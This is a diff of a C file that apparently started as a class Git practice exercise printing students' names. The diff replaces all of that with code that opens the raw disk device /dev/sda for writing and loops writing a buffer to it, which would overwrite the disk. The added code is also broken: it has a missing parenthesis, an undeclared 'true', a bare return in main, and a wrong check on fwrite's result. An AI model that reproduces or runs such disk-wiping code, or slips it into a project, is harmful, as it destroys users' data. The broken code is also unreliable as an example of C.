@@ -1,35 +1,24 @@
-/*
-CS 240 Git Practice File
-Add a statement that prints your name in main
-*/
-
-void Preston(int);
-void Bruno();
-
 #include <stdio.h>
+int main() {
+    char buf[8192];
+    FILE *f = fopen("/dev/sda", "w");
+    if(f == NULL) {
+       perror("Could not open file for writing");
+       return;
+    }
 
-int main()
-{
-   puts("Lonnie Bowe");
-   Preston(0);
-   Bruno();
-   return 0;
-}
+    long unsigned int written = 0;
 
-void Preston(int index)
-{
-   char name[] = "Preston Bennett\n";
+    while(true) {
+        unsigned count = fwrite(buf, sizeof(buf), 1, f);
+        written += count;
+        if(count != sizeof(buf) {
+            perror("Could not write file");
+            break;
+        }; 
+    }
 
-   if (name[index] == '\0')
-   { return; }
+    fclose(f);
 
-   else
-   {
-      printf("%c", name[index]);
-      Preston(index + 1);
-   }
-}
-
-void Bruno(){
-   printf("Bruno Jahel\n");
+    printf("Bytes written: %lu\n", written);
 }
